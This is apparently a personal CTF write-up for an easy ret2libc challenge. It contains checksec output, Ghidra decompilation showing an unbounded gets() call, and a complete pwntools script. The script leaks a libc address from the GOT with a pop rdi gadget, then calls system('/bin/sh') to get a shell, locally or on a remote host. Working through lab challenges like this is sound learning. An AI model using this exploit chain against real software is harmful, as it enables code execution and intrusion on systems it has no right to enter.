
`checksec --file=vuln `

| RELRO           | STACK CANARY      | NX            | PIE             | RPATH      | RUNPATH      | Symbols    | FORTIFY | Fortified | Fortifiable | FILE   |
|-----------------|-------------------|---------------|-----------------|------------|--------------|------------|---------|-----------|-------------|--------|
| Partial RELRO   | No canary found    | NX enabled    | No PIE          | No RPATH   | No RUNPATH   | 68 Symbols | No      | 0         | 2           | vuln   |


`file `vuln: 

`ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=05edff4a2422f4bf07ee989dc914de19b50908ad, for GNU/Linux 3.2.0, not stripped`

#easy #ret2libc #Buffer-overflow #GOT-leak

#### tools
[[gdb-pwndbg]]
[[ghidra]]
[[Ropper]]

## Simple buffer overflow GOT leak ret2libc

https://book.hacktricks.xyz/binary-exploitation/rop-return-oriented-programing/ret2lib/rop-leaking-libc-address

NX Enabled so we've got to use libc - No pie enabled so should make it easier. We can leak puts or fgets using a rop gadget to then find out the libc base and following that, call system with the `/bin/sh` argument to pop a shell and cat the flag.

### Reflection
This was one of the more difficult challenges i managed to solve with the help of the hack tricks book linked above. The concept of using a `pop rdi, ret;` to first put the address of a GOT function in `rdi` and call puts to leak the address is new to me but quite intuitive. It was a fairly simple process to modify the code to work with this challenge though it took me some time to work out how to leak `fgets` instead of puts to narrow down the `libc` version which allowed the exploit to work remotely.

### Decompiled with Ghidra:

```
undefined8 main(void)

{
  char local_108 [256];
  
  puts("--- IO DEMOS ---");
  puts("1. gets/puts");
  call_gets();
  puts(local_108);
  puts("2. fgets/fputs");
  fgets(local_108,0x100,stdin);
  fputs(local_108,stdout);
  return 0;
}

void call_gets(void)

{
  char *in_RDI;
  
  gets(in_RDI);
  return;
}

```


```
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)
  
# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'
# libc = ELF('./libc.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc6_2.35-0ubuntu3.5_amd64.so')

def get_addr(func_name):
    FUNC_GOT = elf.got[func_name]
    log.info(func_name + " GOT @ " + hex(FUNC_GOT))
    # Create rop chain
    rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
    #Send our rop-chain payload
    #p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
    print(io.clean()) # clean socket buffer (read all and print)
    io.sendline(rop1)
    io.recvline()
    io.recvline()
    io.sendline(b"a")
    io.recvline()
    #Parse leaked address
    recieved = io.recvline().strip()
    print("RECVD: ", recieved)
    leak = u64(recieved.ljust(8, b"\x00"))
    log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
    #If not libc yet, stop here
    if libc != "":    
        libc.address = leak - libc.symbols[func_name] #Save libc base
        log.info("libc base @ %s" % hex(libc.address))
    return hex(leak)
  

io = start()

OFFSET = b"a" * 264

rop = ROP('./vuln')
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts

MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"

RET = (rop.find_gadget(['ret']))[0]
log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))

print("LEAKED ", get_addr("puts"))
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh'))
io.recvline()
io.recvline()
print(io.clean())
io.sendline(OFFSET+p64(RET)+p64(POP_RDI)+p64(binsh)+p64(system))
print("Recvd ", io.recvline())

# Get flag/shel
io.interactive()
```